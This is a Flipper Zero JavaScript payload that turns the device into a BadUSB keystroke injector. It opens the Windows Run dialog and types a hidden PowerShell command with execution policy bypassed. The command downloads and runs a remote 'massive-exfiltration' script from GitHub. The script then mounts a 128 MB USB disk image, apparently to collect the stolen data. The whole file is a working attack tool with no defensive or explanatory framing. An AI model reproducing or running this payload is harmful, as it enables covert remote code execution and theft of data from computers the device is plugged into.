let usbdisk = require("usbdisk");
let storage = require("storage");
let badusb = require("badusb");
let notify = require("notification");
let diskPath = "/ext/apps_data/mass_storage/128MB.img";

if (!storage.exists(diskPath)) {
  print("Creating image...");
  usbdisk.createImage(diskPath, 128 * 1024 * 1024);
}
badusb.setup({
  vid: 0xaaaa,
  pid: 0xbbbb,
  mfr_name: "Flipper",
  prod_name: "Zero",
});
// Wait until connected
while (!badusb.isConnected()) {
  delay(1000);
}

// After connected

notify.blink("red", "short");
print("USB is connected");
badusb.press("GUI", "r");
delay(500);
badusb.println(
  "powershell -w h -Ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/dev/massive-exfiltration/no-input-massive-exfil.ps1 | iex"
);
badusb.quit();
delay(3000);
print("Starting UsbDisk...");
usbdisk.start(diskPath);
//print("Started, waiting until ejected...");
while (!usbdisk.wasEjected()) {
  delay(1000);
}
print("Ejected, stopping UsbDisk...");
usbdisk.stop();
print("Done");
